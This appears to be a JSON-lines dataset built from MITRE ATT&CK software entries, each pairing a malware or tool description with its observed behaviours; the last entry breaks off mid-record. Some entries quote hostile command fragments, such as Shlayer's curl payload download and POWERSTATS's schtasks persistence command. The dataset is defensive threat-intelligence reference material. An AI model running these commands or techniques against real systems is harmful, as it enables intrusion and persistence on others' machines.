{"text": " [Stuxnet](https://attack.mitre.org/software/S0603) was the first publicly reported piece of malware to specifically target industrial control systems devices. [Stuxnet](https://attack.mitre.org/software/S0603) is a large and complex piece of malware that utilized multiple different behaviors including multiple zero-day vulnerabilities, a sophisticated Windows rootkit, and network infection routines.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: CISA ICS Advisory ICSA-10-272-01)(Citation: ESET Stuxnet Under the Microscope)(Citation: Langer Stuxnet) [Stuxnet](https://attack.mitre.org/software/S0603) was discovered in 2010, with some components being used as early as November 2008.(Citation: Symantec W.32 Stuxnet Dossier)", "idx": "https://attack.mitre.org/software/S0603", "title": "Stuxnet", "entity": "Stuxnet", "entity_type": "software", "entity_context": ["Stuxnet uses the SetSecurityDescriptorDacl API to reduce object integrity levels.", "Stuxnet calls LoadLibrary then executes exports from a DLL.", "Stuxnet uses an RPC server that contains a file dropping routine and support for payload version updates for P2P communications within a victim network.", "Stuxnet can propagate via removable media using an autorun.inf file or the CVE-2010-2568 LNK vulnerability.", "Stuxnet infected WinCC machines via a hardcoded database server password.", "Stuxnet enumerates user accounts of the domain.", "Stuxnet uses a Windows rootkit to mask its binaries and other relevant files.", "Stuxnet enumerates user accounts of the local host.", "Stuxnet checks for specific operating systems on 32-bit machines, Registry keys, and dates for vulnerabilities, and will exit execution if the values are not met. ", "Stuxnet can create registry keys to load driver files.", "Stuxnet injects an entire DLL into an existing, newly created, or preselected trusted process.", "Stuxnet uses a driver registered as a boot start service as the main load-point.", "Stuxnet transforms encrypted binary data into an ASCII string in order to use it as a URL parameter value.", "Stuxnet uses encrypted configuration blocks and writes encrypted files to disk.", "Stuxnet collects the time and date of a system when it is infected.", "Stuxnet infects remote servers via network shares and by infecting WinCC database views with malicious code.", "Stuxnet attempts to access network resources with a domain account’s credentials.", "Stuxnet uses an RPC server that contains a routine for file deletion.", "Stuxnet enumerates removable drives for infection.", "Stuxnet uses a driver to scan for specific filesystem driver objects.", "Stuxnet searches the Registry for indicators of security programs.", "Stuxnet encrypts exfiltrated data via C2 with static 31-byte long XOR keys.", "Stuxnet enumerates the directories of a network resource.", "Stuxnet used xp_cmdshell to store and execute SQL code.", "Stuxnet uses HTTP to communicate with a command and control server. ", "Stuxnet reduces the integrity level of objects to allow write actions.", "Stuxnet propagates to available network shares.", "Stuxnet schedules a network job to execute two minutes after host infection.", "Stuxnet enumerates the currently running processes related to a variety of security products.", "Stuxnet used a digitally signed driver with a compromised Realtek certificate.", "Stuxnet used WMI with an <code>explorer.exe</code> token to execute on a remote share.", "Stuxnet removes itself from the system through a DLL export by deleting specific files and stored procedures.", "Stuxnet attempts to impersonate an anonymous token to enumerate bindings in the service control manager.", "Stuxnet encodes the payload of system information sent to the command and control servers using a one byte 0xFF XOR key. Stuxnet also uses a 31-byte long static byte string to XOR data sent to command and control servers. The servers use a different static key to encrypt replies to the implant. ", "Stuxnet used copies of .lnk shortcuts to propagate through removable media.", "Stuxnet propagates using the MS10-061 Print Spooler and MS08-067 Windows Server Service vulnerabilities.", "Stuxnet extracts and writes driver files that match the times of other legitimate files.", "Stuxnet can propagate via peer-to-peer communication and updates using RPC.", "Stuxnet collects system information including computer and domain names, OS version, and S7P paths.", "Stuxnet decrypts resources that are loaded into memory and executed.", "Stuxnet collects the IP address of a compromised system.", "Stuxnet sends compromised victim information via HTTP.", "Stuxnet has the ability to generate new C2 domains.", "Stuxnet used MS10-073 and an undisclosed Task Scheduler vulnerability to escalate privileges on local Windows machines.", "Stuxnet installs an RPC server for P2P communications."], "is_subtechnique": false}
{"text": " [CARROTBAT](https://attack.mitre.org/software/S0462) is a customized dropper that has been in use since at least 2017. [CARROTBAT](https://attack.mitre.org/software/S0462) has been used to install [SYSCON](https://attack.mitre.org/software/S0464) and has infrastructure overlap with [KONNI](https://attack.mitre.org/software/S0356).(Citation: Unit 42 CARROTBAT November 2018)(Citation: Unit 42 CARROTBAT January 2020)", "idx": "https://attack.mitre.org/software/S0462", "title": "CARROTBAT", "entity": "CARROTBAT", "entity_type": "software", "entity_context": ["CARROTBAT has the ability to download and execute a remote file via certutil.", "CARROTBAT has the ability to download a base64 encoded payload and execute obfuscated commands on the infected host.", "CARROTBAT has the ability to determine the operating system of the compromised host and whether Windows is being run with x86 or x64 architecture.", "CARROTBAT has the ability to delete downloaded files from a compromised host.", "CARROTBAT has the ability to execute command line arguments on a compromised host."], "is_subtechnique": false}
{"text": " [OopsIE](https://attack.mitre.org/software/S0264) is a Trojan used by [OilRig](https://attack.mitre.org/groups/G0049) to remotely execute commands as well as upload/download files to/from victims. (Citation: Unit 42 OopsIE! Feb 2018)", "idx": "https://attack.mitre.org/software/S0264", "title": "OopsIE", "entity": "OopsIE", "entity_type": "software", "entity_context": ["OopsIE uses HTTP for C2 communications.", "OopsIE stages the output from command execution and collected files in specific folders before exfiltration.", "OopsIE exfiltrates command output and collected files to its C2 server in 1500-byte blocks.", "OopsIE compresses collected files with a simple character replacement scheme before sending them to its C2 server.", "OopsIE checks to see if the system is configured with \"Daylight\" time and checks for a specific region to be set for the timezone.", "OopsIE encodes data in hexadecimal format over the C2 channel.", "OopsIE uses WMI to perform discovery techniques.", "OopsIE compresses collected files with GZipStream before sending them to its C2 server.", "OopsIE uses the SmartAssembly obfuscator to pack an embedded .Net Framework assembly used for C2.", "OopsIE uses the command prompt to execute commands on the victim's machine.", "OopsIE creates and uses a VBScript as part of its persistent execution.", "OopsIE performs several anti-VM and sandbox checks on the victim's machine. One technique the group has used was to perform a WMI query <code>SELECT * FROM MSAcpi_ThermalZoneTemperature</code> to check the temperature to see if it’s running in a virtual environment.", "OopsIE can download files from its C2 server to the victim's machine.", "OopsIE creates a scheduled task to run itself every three minutes.", "OopsIE concatenates then decompresses multiple resources to load an embedded .Net Framework assembly.", "OopsIE has the capability to delete files and scripts from the victim's machine.", "OopsIE checks for information on the CPU fan, temperature, mouse, hard disk, and motherboard as part of its anti-VM checks.", "OopsIE can upload files from the victim's machine to its C2 server.", "OopsIE uses the Confuser protector to obfuscate an embedded .Net Framework assembly used for C2. OopsIE also encodes collected data in hexadecimal format before writing to files on disk and obfuscates strings."], "is_subtechnique": false}
{"text": " [OceanSalt](https://attack.mitre.org/software/S0346) is a Trojan that was used in a campaign targeting victims in South Korea, United States, and Canada. [OceanSalt](https://attack.mitre.org/software/S0346) shares code similarity with [SpyNote RAT](https://attack.mitre.org/software/S0305), which has been linked to [APT1](https://attack.mitre.org/groups/G0006).(Citation: McAfee Oceansalt Oct 2018)", "idx": "https://attack.mitre.org/software/S0346", "title": "OceanSalt", "entity": "OceanSalt", "entity_type": "software", "entity_context": ["OceanSalt can collect the computer name from the system.", "OceanSalt has been delivered via spearphishing emails with Microsoft Office attachments.", "OceanSalt can encode data with a NOT operation before sending the data to the control server.", "OceanSalt uses Port Number 8080 for C2.", "OceanSalt can create a reverse shell on the infected endpoint using cmd.exe. OceanSalt has been executed via malicious macros.", "OceanSalt can extract drive information from the endpoint and search files on the system.", "OceanSalt can collect the victim’s IP address.", "OceanSalt can delete files from the system.", "OceanSalt can collect the name and ID for every process running on the system."], "is_subtechnique": false}
{"text": " [hcdLoader](https://attack.mitre.org/software/S0071) is a remote access tool (RAT) that has been used by [APT18](https://attack.mitre.org/groups/G0026). (Citation: Dell Lateral Movement)", "idx": "https://attack.mitre.org/software/S0071", "title": "hcdLoader", "entity": "hcdLoader", "entity_type": "software", "entity_context": ["hcdLoader installs itself as a service for persistence.", "hcdLoader provides command-line access to the compromised system."], "is_subtechnique": false}
{"text": " [Arp](https://attack.mitre.org/software/S0099) displays information about a system's Address Resolution Protocol (ARP) cache. (Citation: TechNet Arp)", "idx": "https://attack.mitre.org/software/S0099", "title": "Arp", "entity": "Arp", "entity_type": "software", "entity_context": ["Arp can be used to display ARP configuration information on the host."], "is_subtechnique": false}
{"text": " [HALFBAKED](https://attack.mitre.org/software/S0151) is a malware family consisting of multiple components intended to establish persistence in victim networks. (Citation: FireEye FIN7 April 2017)", "idx": "https://attack.mitre.org/software/S0151", "title": "HALFBAKED", "entity": "HALFBAKED", "entity_type": "software", "entity_context": ["HALFBAKED can obtain information about running processes on the victim.", "HALFBAKED can execute PowerShell scripts.", "HALFBAKED can obtain information about the OS, processor, and BIOS.", "HALFBAKED can use WMI queries to gather system information.", "HALFBAKED can obtain screenshots from the victim.", "HALFBAKED can delete a specified file."], "is_subtechnique": false}
{"text": " [Dtrack](https://attack.mitre.org/software/S0567) is spyware that was discovered in 2019 and has been used against Indian financial institutions, research facilities, and the Kudankulam Nuclear Power Plant. [Dtrack](https://attack.mitre.org/software/S0567) shares similarities with the DarkSeoul campaign, which was attributed to [Lazarus Group](https://attack.mitre.org/groups/G0032). (Citation: Kaspersky Dtrack)(Citation: Securelist Dtrack)(Citation: Dragos WASSONITE)(Citation: CyberBit Dtrack)(Citation: ZDNet Dtrack)", "idx": "https://attack.mitre.org/software/S0567", "title": "Dtrack", "entity": "Dtrack", "entity_type": "software", "entity_context": ["Dtrack’s dropper can list all running processes.", "Dtrack has used <code>cmd.exe</code> to add a persistent service.", "Dtrack can save collected data to disk, different file formats, and network shares.", "Dtrack can collect network and active connection information.", "Dtrack contains a function that calls <code>LoadLibrary</code> and <code>GetProcAddress</code>.", "Dtrack can collect a variety of information from victim machines.", "Dtrack can retrieve browser history.", "Dtrack has used a decryption routine that is part of an executable physical patch.", "Dtrack has used process hollowing shellcode to target a predefined list of processes from <code>%SYSTEM32%</code>.", "One of Dtrack can hide in replicas of legitimate programs like OllyDbg, 7-Zip, and FileZilla.", "Dtrack’s dropper contains a keylogging executable.", "One of Dtrack can replace the normal flow of a program execution with malicious code.", "Dtrack can remove its persistence and delete itself.", "Dtrack can add a service called WBService to establish persistence.", "Dtrack has used a dropper that embeds an encrypted payload as extra data.", "Dtrack can list files on available disk volumes.", "Dtrack’s can download and upload a file to the victim’s computer.", "Dtrack packs collected data into a password protected archive.", "Dtrack can collect the host's IP addresses using the <code>ipconfig</code> command.", "Dtrack’s RAT makes a persistent target file with auto execution on the host start.", "Dtrack used hard-coded credentials to gain access to a network share.", "Dtrack can collect the RegisteredOwner, RegisteredOrganization, and InstallDate registry values.", "Dtrack can collect the victim's computer name, hostname and adapter information to create a unique identifier."], "is_subtechnique": false}
{"text": " [Impacket](https://attack.mitre.org/software/S0357) is an open source collection of modules written in Python for programmatically constructing and manipulating network protocols. [Impacket](https://attack.mitre.org/software/S0357) contains several tools for remote service execution, Kerberos manipulation, Windows credential dumping, packet sniffing, and relay attacks.(Citation: Impacket Tools)", "idx": "https://attack.mitre.org/software/S0357", "title": "Impacket", "entity": "Impacket", "entity_type": "software", "entity_context": ["Impacket modules like GetUserSPNs can be used to get Service Principal Names (SPNs) for user accounts. The output is formatted to be compatible with cracking tools like John the Ripper and Hashcat.", "Impacket contains various modules emulating other service execution tools such as PsExec.", "SecretsDump and Mimikatz modules within Impacket can perform credential dumping to obtain account and password information.", "Impacket can be used to sniff network traffic via an interface or raw socket.", "Impacket modules like ntlmrelayx and smbrelayx can be used in conjunction with Network Sniffing and LLMNR/NBT-NS Poisoning and SMB Relay to gather NetNTLM credentials for Brute Force or relay attacks that can gain code execution.", "SecretsDump and Mimikatz modules within Impacket can perform credential dumping to obtain account and password information from NTDS.dit.", "Impacket's wmiexec module can be used to execute commands through WMI."], "is_subtechnique": false}
{"text": " [Wiarp](https://attack.mitre.org/software/S0206) is a trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Wiarp May 2012)", "idx": "https://attack.mitre.org/software/S0206", "title": "Wiarp", "entity": "Wiarp", "entity_type": "software", "entity_context": ["Wiarp creates a backdoor through which remote attackers can create a service.", "Wiarp creates a backdoor through which remote attackers can open a command line interface.", "Wiarp creates a backdoor through which remote attackers can inject files into running processes.", "Wiarp creates a backdoor through which remote attackers can download files.", "Wiarp connects to external C2 infrastructure over the HTTP port."], "is_subtechnique": false}
{"text": " [Crimson](https://attack.mitre.org/software/S0115) is a remote access Trojan that has been used by [Transparent Tribe](https://attack.mitre.org/groups/G0134) since at least 2016.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020)", "idx": "https://attack.mitre.org/software/S0115", "title": "Crimson", "entity": "Crimson", "entity_type": "software", "entity_context": ["Crimson can spread across systems by infecting removable media.", "Crimson has the ability to discover pluggable/removable drives to extract files from.", "Crimson contains commands to list files and directories, as well as search for files matching certain extensions from a defined list.", "Crimson contains a module to steal credentials from Web browsers on the victim machine.", "Crimson contains a command to collect and exfiltrate emails from Outlook.", "Crimson can identify the geographical location of a victim host.\t ", "Crimson can add Registry run keys for persistence.", "Crimson can use a HTTP GET request to download its final payload.", "Crimson contains a module to collect data from removable drives.", "Crimson contains a command to collect information about anti-virus software on the victim.", "Crimson contains a command to perform screen captures.", "Crimson can determine when it has been installed on a host for at least 15 days before downloading the final payload.", "Crimson can check the Registry for the presence of <code>HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\last_edate</code> to determine how long it has been installed on a host.", "Crimson has the ability to execute commands with the COMSPEC environment variable.", "Crimson can capture webcam video on targeted systems.", "Crimson contains a command to collect the victim PC name, disk drive information, and operating system.", "Crimson contains a command to list processes.\t ", "Crimson can perform audio surveillance using microphones.", "Crimson can decode its encoded PE file prior to execution.", "Crimson has the ability to determine the date and time on a compromised host.", "Crimson can use a module to perform keylogging on compromised hosts.", "Crimson can set a Registry key to determine how long it has been installed and possibly to indicate the version number.", "Crimson uses a custom TCP protocol for C2.\t ", "Crimson contains a command to retrieve files from its C2 server.", "Crimson can identify the user on a targeted system.", "Crimson contains a command to collect the victim MAC address and LAN IP.", "Crimson has the ability to delete files from a compromised host.\t "], "is_subtechnique": false}
{"text": " [Ngrok](https://attack.mitre.org/software/S0508) is a legitimate reverse proxy tool that can create a secure tunnel to servers located behind firewalls or on local machines that do not have a public IP. [Ngrok](https://attack.mitre.org/software/S0508) has been leveraged by threat actors in several campaigns including use for lateral movement and data exfiltration.(Citation: Zdnet Ngrok September 2018)(Citation: FireEye Maze May 2020)(Citation: Cyware Ngrok May 2019)", "idx": "https://attack.mitre.org/software/S0508", "title": "Ngrok", "entity": "Ngrok", "entity_type": "software", "entity_context": ["Ngrok has been used by threat actors to configure servers for data exfiltration.", "Ngrok can tunnel RDP and other services securely over internet connections.", "Ngrok can provide DGA for C2 servers through the use of random URL strings that change every 12 hours.", "Ngrok can be used to proxy connections to machines located behind NAT or firewalls.", "Ngrok has been used by threat actors to proxy C2 connections to ngrok service subdomains."], "is_subtechnique": false}
{"text": " [POWERSTATS](https://attack.mitre.org/software/S0223) is a PowerShell-based first stage backdoor used by [MuddyWater](https://attack.mitre.org/groups/G0069). (Citation: Unit 42 MuddyWater Nov 2017)", "idx": "https://attack.mitre.org/software/S0223", "title": "POWERSTATS", "entity": "POWERSTATS", "entity_type": "software", "entity_context": ["POWERSTATS can sleep for a given number of seconds.", "POWERSTATS can upload files from compromised hosts.", "POWERSTATS has used useless code blocks to counter analysis.", "POWERSTATS has encrypted C2 traffic with RSA.", "POWERSTATS has created a scheduled task named \"MicrosoftEdge\" to establish persistence.", "POWERSTATS has used port 80 for C2.", "POWERSTATS can use DCOM (targeting the 127.0.0.1 loopback address) to execute additional payloads on compromised hosts.", "POWERSTATS can use Mshta.exe to execute additional payloads on compromised hosts.", "POWERSTATS can retrieve IP, network adapter configuration information, and domain from compromised hosts.", "POWERSTATS can delete all files on the C:\\, D:\\, E:\\ and, F:\\ drives using PowerShell Remove-Item commands.", "POWERSTATS can disable Microsoft Office Protected View by changing Registry keys.", "POWERSTATS can retrieve screenshots from compromised hosts.", "POWERSTATS has detected security tools.", "POWERSTATS can retrieve usernames from compromised hosts.", "POWERSTATS can retrieve and execute additional PowerShell payloads from the C2 server.", "POWERSTATS has used <code>get_tasklist</code> to discover processes on the compromised host.", "POWERSTATS can use DDE to execute additional payloads on compromised hosts.", "POWERSTATS has established persistence through a scheduled task using the command <code>”C:\\Windows\\system32\\schtasks.exe” /Create /F /SC DAILY /ST 12:00 /TN MicrosoftEdge /TR “c:\\Windows\\system32\\wscript.exe C:\\Windows\\temp\\Windows.vbe”</code>.", "POWERSTATS encoded C2 traffic with base64.", "POWERSTATS uses PowerShell for obfuscation and execution.", "POWERSTATS can retrieve OS name/architecture and computer/domain name information from compromised hosts.", "POWERSTATS can deobfuscate the main backdoor code.", "POWERSTATS has connected to C2 servers through proxies.", "POWERSTATS can use JavaScript code for execution.", "POWERSTATS uses character replacement, PowerShell environment variables, and XOR encoding to obfuscate code. POWERSTATS's backdoor code is a multi-layer obfuscated, encoded, and compressed blob.  POWERSTATS has used PowerShell code with custom string obfuscation ", "POWERSTATS can use VBScript (VBE) code for execution.", "POWERSTATS has the ability to identify the username on the compromised host.", "POWERSTATS can use WMI queries to retrieve data from compromised hosts."], "is_subtechnique": false}
{"text": " [RawDisk](https://attack.mitre.org/software/S0364) is a legitimate commercial driver from the EldoS Corporation that is used for interacting with files, disks, and partitions. The driver allows for direct modification of data on a local computer's hard drive. In some cases, the tool can enact these raw disk modifications from user-mode processes, circumventing Windows operating system security features.(Citation: EldoS RawDisk ITpro)(Citation: Novetta Blockbuster Destructive Malware)", "idx": "https://attack.mitre.org/software/S0364", "title": "RawDisk", "entity": "RawDisk", "entity_type": "software", "entity_context": ["RawDisk has been used to directly access the hard disk to help overwrite arbitrarily sized portions of disk content.", "RawDisk was used in Shamoon to write to protected system locations such as the MBR and disk partitions in an effort to destroy data.", "RawDisk was used in Shamoon to help overwrite components of disk structure like the MBR and disk partitions."], "is_subtechnique": false}
{"text": " [Dipsind](https://attack.mitre.org/software/S0200) is a malware family of backdoors that appear to be used exclusively by [PLATINUM](https://attack.mitre.org/groups/G0068). (Citation: Microsoft PLATINUM April 2016)", "idx": "https://attack.mitre.org/software/S0200", "title": "Dipsind", "entity": "Dipsind", "entity_type": "software", "entity_context": ["Dipsind can download remote files.", "A Dipsind variant registers as a Winlogon Event Notify DLL to establish persistence.", "Dipsind can be configured to only run during normal working hours, which would make its communications harder to distinguish from normal traffic.", "Dipsind encrypts C2 data with AES256 in ECB mode.", "Dipsind can spawn remote shells.", "Dipsind uses HTTP for C2.", "Dipsind encodes C2 traffic with base64."], "is_subtechnique": false}
{"text": " [meek](https://attack.mitre.org/software/S0175) is an open-source Tor plugin that tunnels Tor traffic through HTTPS connections.", "idx": "https://attack.mitre.org/software/S0175", "title": "meek", "entity": "meek", "entity_type": "software", "entity_context": ["meek uses Domain Fronting to disguise the destination of network traffic as another server that is hosted in the same Content Delivery Network (CDN) as the intended destination."], "is_subtechnique": false}
{"text": " [Cadelspy](https://attack.mitre.org/software/S0454) is a backdoor that has been used by [APT39](https://attack.mitre.org/groups/G0087).(Citation: Symantec Chafer Dec 2015)", "idx": "https://attack.mitre.org/software/S0454", "title": "Cadelspy", "entity": "Cadelspy", "entity_type": "software", "entity_context": ["Cadelspy has the ability to capture screenshots and webcam photos.", "Cadelspy has the ability to steal data from the clipboard.", "Cadelspy has the ability to record audio from the compromised host.", "Cadelspy has the ability to identify open windows on the compromised host.", "Cadelspy has the ability to compress stolen data into a .cab file.", "Cadelspy has the ability to discover information about the compromised host.", "Cadelspy has the ability to steal information about printers and the documents sent to printers.", "Cadelspy has the ability to log keystrokes on the compromised host."], "is_subtechnique": false}
{"text": " [gsecdump](https://attack.mitre.org/software/S0008) is a publicly-available credential dumper used to obtain password hashes and LSA secrets from Windows operating systems. (Citation: TrueSec Gsecdump)", "idx": "https://attack.mitre.org/software/S0008", "title": "gsecdump", "entity": "gsecdump", "entity_type": "software", "entity_context": ["gsecdump can dump Windows password hashes from the SAM.", "gsecdump can dump LSA secrets."], "is_subtechnique": false}
{"text": " [Winexe](https://attack.mitre.org/software/S0191) is a lightweight, open source tool similar to [PsExec](https://attack.mitre.org/software/S0029) designed to allow system administrators to execute commands on remote servers. (Citation: Winexe Github Sept 2013) [Winexe](https://attack.mitre.org/software/S0191) is unique in that it is a GNU/Linux based client. (Citation: Überwachung APT28 Forfiles June 2015)", "idx": "https://attack.mitre.org/software/S0191", "title": "Winexe", "entity": "Winexe", "entity_type": "software", "entity_context": ["Winexe installs a service on the remote system, executes the command, then uninstalls the service."], "is_subtechnique": false}
{"text": " [Unknown Logger](https://attack.mitre.org/software/S0130) is a publicly released, free backdoor. Version 1.5 of the backdoor has been used by the actors responsible for the MONSOON campaign. (Citation: Forcepoint Monsoon)", "idx": "https://attack.mitre.org/software/S0130", "title": "Unknown Logger", "entity": "Unknown Logger", "entity_type": "software", "entity_context": ["Unknown Logger is capable of recording keystrokes.", "Unknown Logger can obtain information about the victim usernames.", "Unknown Logger is capable of spreading to USB devices.", "Unknown Logger is capable of downloading remote files.", "Unknown Logger can obtain information about the victim's IP address.", "Unknown Logger has functionality to disable security tools, including Kaspersky, BitDefender, and MalwareBytes.", "Unknown Logger can obtain information about the victim computer name, physical memory, country, and date.", "Unknown Logger is capable of stealing usernames and passwords from browsers on the victim machine."], "is_subtechnique": false}
{"text": " [Volgmer](https://attack.mitre.org/software/S0180) is a backdoor Trojan designed to provide covert access to a compromised system. It has been used since at least 2013 to target the government, financial, automotive, and media industries. Its primary delivery mechanism is suspected to be spearphishing. (Citation: US-CERT Volgmer Nov 2017)", "idx": "https://attack.mitre.org/software/S0180", "title": "Volgmer", "entity": "Volgmer", "entity_type": "software", "entity_context": ["Volgmer queries the system to identify existing services.", "Volgmer stores the encoded configuration file in the Registry key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Security</code>.", "Volgmer can delete files and itself after infection to avoid analysis.", "Volgmer can execute commands on the victim's machine.", "Volgmer executes payloads using the Windows API call CreateProcessW().", "Volgmer checks the system for certain Registry keys.", "Volgmer can gather a list of processes.", "Volgmer can list directories on a victim.", "Volgmer installs a copy of itself in a randomly selected service, then overwrites the ServiceDLL entry in the service's Registry entry. Some Volgmer variants also install .dll files as services with names generated by a list of hard-coded strings.", "A Volgmer variant is encoded using a simple XOR cipher.", "Volgmer deobfuscates its strings and APIs once its executed.", "Volgmer can gather system information, the computer name, OS version, drive and serial information from the victim's machine.", "Some Volgmer variants add new services with display names generated by a list of hard-coded strings such as Application, Background, Security, and Windows, presumably as a way to masquerade as a legitimate service.", "Volgmer can download remote files and additional payloads to the victim's machine.", "Volgmer uses a simple XOR cipher to encrypt traffic and files.", "Volgmer can gather information about TCP connection state.", "Some Volgmer variants use SSL to encrypt C2 communications.", "Some Volgmer variants use ports 8080 and 8000 for C2.", "Volgmer can gather the IP address from the victim's machine."], "is_subtechnique": false}
{"text": " [USBferry](https://attack.mitre.org/software/S0452) is an information stealing malware and has been used by [Tropic Trooper](https://attack.mitre.org/groups/G0081) in targeted attacks against Taiwanese and Philippine air-gapped military environments. [USBferry](https://attack.mitre.org/software/S0452) shares an overlapping codebase with [YAHOYAH](https://attack.mitre.org/software/S0388), though it has several features which makes it a distinct piece of malware.(Citation: TrendMicro Tropic Trooper May 2020)", "idx": "https://attack.mitre.org/software/S0452", "title": "USBferry", "entity": "USBferry", "entity_type": "software", "entity_context": ["USBferry can use <code>tasklist</code> to gather information about the process running on the infected system.\t", "USBferry can collect information from an air-gapped host machine.\t", "USBferry can copy its installer to attached USB storage devices.", "USBferry can detect the victim's file or folder list.\t", "USBferry can check for connected USB devices.", "USBferry can use <code>net view</code> to gather information about remote systems.", "USBferry can detect the infected machine's network topology using <code>ipconfig</code> and <code>arp</code>.\t", "USBferry can execute various Windows commands.\t", "USBferry can use <code>netstat</code> and <code>nbtstat</code> to detect active network connections.\t", "USBferry can use <code>net user</code> to gather information about local accounts.\t", "USBferry can execute rundll32.exe in memory to avoid detection.\t"], "is_subtechnique": false}
{"text": " [OSX/Shlayer](https://attack.mitre.org/software/S0402) is a Trojan designed to install adware on macOS that was first discovered in 2018.(Citation: Carbon Black Shlayer Feb 2019)(Citation: Intego Shlayer Feb 2018)", "idx": "https://attack.mitre.org/software/S0402", "title": "OSX/Shlayer", "entity": "OSX/Shlayer", "entity_type": "software", "entity_context": ["OSX/Shlayer can masquerade as a Flash Player update.", "OSX/Shlayer uses the <code>mktemp</code> utility to make random and unique filenames for payloads, such as <code>export tmpDir=\"$(mktemp -d /tmp/XXXXXXXXXXXX)\"</code> or <code>mktemp -t Installer</code>.", "OSX/Shlayer can download payloads, and extract bytes from files. OSX/Shlayer uses the <code>curl -fsL \"$url\" >$tmp_path</code> command to download malicious payloads into a temporary directory.", "OSX/Shlayer uses the command <code>appDir=\"$(dirname $(dirname \"$currentDir\"))\"</code> and <code>$(dirname \"$(pwd -P)\")</code> to construct installation paths.", "OSX/Shlayer can use bash scripts to check the macOS version, download payloads, and extract bytes from files. OSX/Shlayer uses the command <code>sh -c tail -c +1381...</code> to extract bytes at an offset from a specified file. OSX/Shlayer uses the <code>curl -fsL \"$url\" >$tmp_path</code> command to download malicious payloads into a temporary directory.", "OSX/Shlayer can use the <code>chmod</code> utility to set a file as executable, such as <code>chmod 777</code> or <code>chmod +x</code>.", "OSX/Shlayer collects the IOPlatformUUID, session UID, and the OS version using the command <code>sw_vers -productVersion</code>.", "OSX/Shlayer can escalate privileges to root by asking the user for credentials.", "OSX/Shlayer relies on users mounting and executing a malicious DMG file.", "OSX/Shlayer can base64-decode and AES-decrypt downloaded payloads. Versions of OSX/Shlayer pass encrypted and password-protected code to <code>openssl</code> and then write the payload to the <code>/tmp</code> folder.", "If running with elevated privileges, OSX/Shlayer uses the <code>spctl</code> command to disable Gatekeeper protection for a downloaded file. OSX/Shlayer also leveraged system links pointing to bash scripts in the downloaded DMG file to bypass Gatekeeper, a flaw patched in macOS 11.3 and later versions.", "OSX/Shlayer can install malicious Safari browser extensions to serve ads.", "OSX/Shlayer executes a .command script from a hidden directory in a mounted DMG."], "is_subtechnique": false}
{"text": " [Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, remote access tool that bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.(Citation: cobaltstrike manual) In addition to its own capabilities, [Cobalt Strike](https://attack.mitre.org/software/S0154) leverages the capabilities of other well-known tools such as Metasploit and [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: cobaltstrike manual)", "idx": "https://attack.mitre.org/software/S0154", "title": "Cobalt Strike", "entity": "Cobalt Strike", "entity_type": "software", "entity_context": ["Cobalt Strike can perform browser pivoting and inject into a user's browser to inherit cookies, authenticated HTTP sessions, and client SSL certificates.", "Cobalt Strike can SSH to a remote service.", "Cobalt Strike can inject a variety of payloads into processes dynamically chosen by the adversary.", "Cobalt Strike can use RSA asymmetric encryption with PKCS1 padding to encrypt data sent to the C2 server.", "Cobalt Strike has the ability to use AES-256 symmetric encryption in CBC mode with HMAC-SHA-256 to encrypt task commands and XOR to encrypt shell code and configuration data.", "Cobalt Strike can query <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\<Excel Version>\\Excel\\Security\\AccessVBOM\\</code>  to determine if the security setting for restricting default programmatic access is enabled.", "Cobalt Strike can hash functions to obfuscate calls to the Windows API and use a public/private key pair to encrypt Beacon session metadata.", "Cobalt Strike can recover hashed passwords.", "Cobalt Strike can download a hosted \"beacon\" payload using BITSAdmin.", "Cobalt Strike can use a custom command and control protocol that can be encapsulated in DNS. All protocols use their standard assigned ports.\t", "Cobalt Strike can set its Beacon payload to reach out to the C2 server on an arbitrary and random interval.", "Cobalt Strike can produce a sessions report from compromised hosts.", "Cobalt Strike can spawn a job to inject into LSASS memory and dump password hashes.", "Cobalt Strike can use <code>net localgroup</code> to list local groups on a system.", "Cobalt Strike can use <code>WinRM</code> to execute a payload on a remote host.", "Cobalt Strike has the ability to load DLLs via reflective injection.", "Cobalt Strike can identify targets by querying account groups on a domain contoller.", "Cobalt Strike can use known credentials to run commands and spawn processes as a domain user account.", "Cobalt Strike can steal access tokens from exiting processes.", "Cobalt Strike can use Window admin shares (C$ and ADMIN$) for lateral movement.", "Cobalt Strike includes a capability to modify the Beacon payload to eliminate known signatures or unpacking methods.", "The Cobalt Strike System Profiler can discover applications through the browser and identify the version of Java the target has.", "Cobalt Strike can collect data from a local system.", "Cobalt Strike uses the native Windows Network Enumeration APIs to interrogate and discover targets in a Windows Active Directory network.", "Cobalt Strike can deliver Beacon payloads for lateral movement by leveraging remote COM execution.", "Cobalt Strike can use VBA to perform execution.", "Cobalt Strike's <code>execute-assembly</code> command can run a .NET executable within the memory of a sacrificial process by loading the CLR.", "Cobalt Strike can determine the NetBios name and  the IP addresses of targets machines including domain controllers.", "Cobalt Strike can spawn processes with alternate PPIDs.", "Cobalt Strike can use Python to perform execution.", "Cobalt Strike can explore files on a compromised system.", "Cobalt Strike can deobfuscate shellcode using a rolling XOR and decrypt metadata from Beacon sessions.", "Cobalt Strike has the ability to accept a value for HTTP Host Header to enable domain fronting.", "Cobalt Strike can perform port scans from an infected host.", "Cobalt Strike can use process hollowing for execution.", "Cobalt Strike can determine if the user on an infected machine is in the admin or domain admin group.", "Cobalt Strike can enumerate services on compromised hosts.", "Cobalt Strike can use rundll32.exe to load DLL from the command line.", "Cobalt Strike can timestomp any files or payloads placed on a target machine to help them blend in.", "Cobalt Strike can track key presses with a keylogger module.", "Cobalt Strike uses a command-line interface to interact with systems.", "The Cobalt Strike System Profiler can use JavaScript to perform reconnaissance actions.", "Cobalt Strike can use Base64, URL-safe Base64, or NetBIOS encoding in its C2 traffic.", "Cobalt Strike can be configured to have commands relayed over a peer-to-peer network of infected hosts. This can be used to limit the number of egress points, or provide access to a 